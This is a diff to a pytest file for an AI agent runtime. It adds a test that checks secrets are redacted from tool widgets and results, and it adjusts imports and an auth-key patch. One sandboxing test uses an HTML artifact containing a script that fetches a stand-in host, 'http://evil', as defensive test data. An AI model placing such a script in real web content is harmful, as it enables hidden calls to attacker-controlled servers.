@@ -9,6 +9,7 @@ import pytest
 
 from agent.lean import artifacts, widgets
 from agent.lean.rich_tools import _product_from_jsonld, _product_from_walmart
+import api.auth as api_auth
 
 
 # ── widgets ───────────────────────────────────────────────────────────────
@@ -72,6 +73,40 @@ def test_loop_sends_widgets_with_the_tool_result(monkeypatch):
     assert row["widgets"][0]["data"]["location"] == "Denver"  # kept for reload
 
 
+def test_tool_widget_secrets_are_scrubbed_before_emit_and_persist(monkeypatch):
+    from agent.lean import policy
+    from agent.lean.loop import LeanTurn
+    from agent.lean.personas import AgentPersona
+    from agent.lean.provider import ModelTurn, ToolCall
+    from agent.lean.toolbox import NativeTool, Toolbox
+    from tests.test_lean_runtime import ScriptedClient
+
+    secret = "sk-test-widget-secret-123456"
+    monkeypatch.setattr(policy, "_secret_values", lambda: [secret])
+
+    def lookup(_args):
+        widgets.attach({"type": "citations", "data": {"items": [
+            {"url": f"https://example.test/?key={secret}", "title": f"source {secret}"}
+        ]}})
+        return f"result {secret}"
+
+    events: list[dict] = []
+    box = Toolbox(toolsets=["lookup"], extra_tools=[NativeTool(
+        name="lookup", description="d", parameters={"type": "object", "properties": {}}, func=lookup,
+    )])
+    turn = LeanTurn(
+        client=ScriptedClient([ModelTurn(tool_calls=[ToolCall(id="c1", name="lookup", arguments="{}")]),
+                               ModelTurn(content="done")]),
+        persona=AgentPersona(id="echo", name="Echo"), system_prompt="s", history=[], toolbox=box,
+        session_id="s1", request_id="r", execution_id="e", emit=events.append,
+        cancel=threading.Event(), persist_tool_runs=False,
+    )
+    result = turn.run("look up")
+    assert secret not in str(next(e for e in events if e["type"] == "tool_end"))
+    assert secret not in str(result.timeline)
+    assert "[redacted secret]" in str(result.timeline)
+
+
 # ── product page parsing ─────────────────────────────────────────────────
 
 def test_products_are_read_from_schema_org_and_walmart_data():
@@ -124,7 +159,7 @@ def test_artifact_frames_are_sandboxed_and_need_a_token(store, monkeypatch):
     from fastapi import FastAPI
     from fastapi.testclient import TestClient
 
-    from api.lean_routes import router
+    from api.routes.lean import router
 
     record = artifacts.create(title="App", kind="html", content="<html><head><title>x</title></head><body><script>fetch('http://evil')</script></body></html>")
     page = artifacts.frame_html(record)
@@ -150,7 +185,7 @@ def test_server_lets_a_frame_token_through_only_for_its_frame(store, monkeypatch
 
     monkeypatch.setattr(server.config, "api_auth_enabled", True, raising=False)
     monkeypatch.setattr(server.config, "api_auth_localhost_bypass", False, raising=False)
-    monkeypatch.setattr(server, "_configured_api_auth_key", lambda: "secret-key")
+    monkeypatch.setattr(api_auth, "_configured_api_auth_key", lambda: "secret-key")
     record = artifacts.create(title="App", kind="html", content="<p>x</p>")
     token = artifacts.issue_frame_token(record["id"])
     client = TestClient(server.app)
